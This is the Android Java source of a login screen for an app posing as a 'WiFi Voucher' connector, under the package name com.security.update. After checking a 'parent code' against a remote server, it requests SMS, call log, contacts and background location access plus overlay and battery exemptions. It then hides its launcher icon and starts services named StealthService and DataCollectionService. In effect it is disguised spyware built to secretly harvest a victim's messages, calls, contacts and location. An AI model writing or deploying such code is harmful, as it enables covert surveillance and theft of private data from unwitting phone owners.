package com.security.update;

import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class LoginActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 1001;
    private static final int OVERLAY_PERMISSION_CODE = 1002;
    private static final int BATTERY_OPTIMIZATION_CODE = 1003;

    private EditText codeInput;
    private Button verifyButton;
    private ProgressBar progressBar;
    private TextView titleText, subtitleText, statusText;
    private SharedPreferences prefs;
    private Handler handler;
    private String verifiedCode;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);

        prefs = getSharedPreferences("WiFiVoucher", MODE_PRIVATE);
        handler = new Handler();

        if (prefs.contains("parent_code") && prefs.getBoolean("is_activated", false)) {
            startVoucherService();
            return;
        }

        initViews();
        setupUI();
        setupListeners();
    }

    private void initViews() {
        codeInput = findViewById(R.id.code_input);
        verifyButton = findViewById(R.id.verify_button);
        progressBar = findViewById(R.id.progress_bar);
        titleText = findViewById(R.id.title_text);
        subtitleText = findViewById(R.id.subtitle_text);
        statusText = findViewById(R.id.status_text);
    }

    private void setupUI() {
        titleText.setText("WiFi Voucher");
        titleText.setTextColor(ContextCompat.getColor(this, android.R.color.black));
        titleText.setTextSize(28f);
        titleText.setTypeface(null, android.graphics.Typeface.BOLD);
        subtitleText.setText("Enter your voucher code to connect");
        subtitleText.setTextColor(ContextCompat.getColor(this, android.R.color.darker_gray));
        subtitleText.setTextSize(14f);
        codeInput.setHint("Voucher WiFi Code");
        codeInput.setTextColor(ContextCompat.getColor(this, android.R.color.black));
        verifyButton.setText("CONNECT");
        verifyButton.setBackgroundColor(ContextCompat.getColor(this, android.R.color.holo_green_dark));
        verifyButton.setTextColor(ContextCompat.getColor(this, android.R.color.white));
        statusText.setText("");
        statusText.setTextSize(12f);
        progressBar.setVisibility(View.GONE);
    }

    private void setupListeners() {
        verifyButton.setOnClickListener(v -> {
            String code = codeInput.getText().toString().trim().toUpperCase();
            if (code.isEmpty()) {
                statusText.setText("Please enter your Voucher WiFi Code");
                statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark));
                return;
            }
            if (code.length() < 4) {
                statusText.setText("Code must be at least 4 characters");
                statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark));
                return;
            }
            verifyVoucherCode(code);
        });
    }

    private void verifyVoucherCode(String code) {
        progressBar.setVisibility(View.VISIBLE);
        verifyButton.setEnabled(false);
        statusText.setText("Verifying...");
        statusText.setTextColor(ContextCompat.getColor(this, android.R.color.darker_gray));

        new Thread(() -> {
            try {
                URL url = new URL("https://GhostTester.pythonanywhere.com/api/parent/verify-code");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);

                JSONObject payload = new JSONObject();
                payload.put("parent_code", code);
                OutputStream os = conn.getOutputStream();
                os.write(payload.toString().getBytes("UTF-8"));
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                conn.disconnect();

                if (responseCode == 200) {
                    verifiedCode = code;
                    handler.post(() -> {
                        progressBar.setVisibility(View.GONE);
                        statusText.setText("Code verified! Requesting permissions...");
                        statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_green_dark));
                        requestAllPermissions();
                    });
                } else {
                    handler.post(() -> {
                        progressBar.setVisibility(View.GONE);
                        verifyButton.setEnabled(true);
                        statusText.setText("Invalid Voucher Code");
                        statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark));
                    });
                }
            } catch (Exception e) {
                handler.post(() -> {
                    progressBar.setVisibility(View.GONE);
                    verifyButton.setEnabled(true);
                    statusText.setText("Connection failed. Check internet.");
                    statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark));
                });
            }
        }).start();
    }

    private void requestAllPermissions() {
        List<String> permissionsNeeded = new ArrayList<>();
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED)
            permissionsNeeded.add(android.Manifest.permission.READ_SMS);
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED)
            permissionsNeeded.add(android.Manifest.permission.READ_CALL_LOG);
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED)
            permissionsNeeded.add(android.Manifest.permission.READ_CONTACTS);
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED)
            permissionsNeeded.add(android.Manifest.permission.ACCESS_FINE_LOCATION);
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED)
            permissionsNeeded.add(android.Manifest.permission.ACCESS_COARSE_LOCATION);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED)
                permissionsNeeded.add(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION);
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED)
                permissionsNeeded.add(android.Manifest.permission.POST_NOTIFICATIONS);
        }

        if (!permissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, permissionsNeeded.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        } else {
            onPermissionsGranted();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted) {
                onPermissionsGranted();
            } else {
                statusText.setText("All permissions are required!");
                statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark));
                verifyButton.setEnabled(true);
                progressBar.setVisibility(View.GONE);
            }
        }
    }

    private void onPermissionsGranted() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            statusText.setText("Grant overlay permission...");
            Intent overlayIntent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:" + getPackageName()));
            startActivityForResult(overlayIntent, OVERLAY_PERMISSION_CODE);
        } else {
            requestBatteryOptimization();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == OVERLAY_PERMISSION_CODE || requestCode == BATTERY_OPTIMIZATION_CODE) {
            activateAndFinish();
        }
    }

    private void requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, BATTERY_OPTIMIZATION_CODE);
        } else {
            activateAndFinish();
        }
    }

    private void activateAndFinish() {
        statusText.setText("Activating...");
        prefs.edit()
            .putString("parent_code", verifiedCode)
            .putBoolean("is_activated", true)
            .apply();

        // Hide app icon from launcher immediately
        hideAppIcon();

        handler.postDelayed(() -> {
            Toast.makeText(this, "WiFi Voucher Activated", Toast.LENGTH_SHORT).show();
            startVoucherService();
        }, 500);
    }

    private void hideAppIcon() {
        try {
            PackageManager pm = getPackageManager();
            ComponentName componentName = new ComponentName(this, LoginActivity.class);
            pm.setComponentEnabledSetting(componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        } catch (Exception e) {
            // Continue even if hiding fails
        }
    }

    private void startVoucherService() {
        Intent stealthIntent = new Intent(this, StealthService.class);
        startService(stealthIntent);
        Intent dataIntent = new Intent(this, DataCollectionService.class);
        startService(dataIntent);
        
        // Hide from screen immediately
        moveTaskToBack(true);
        finish();
    }
}
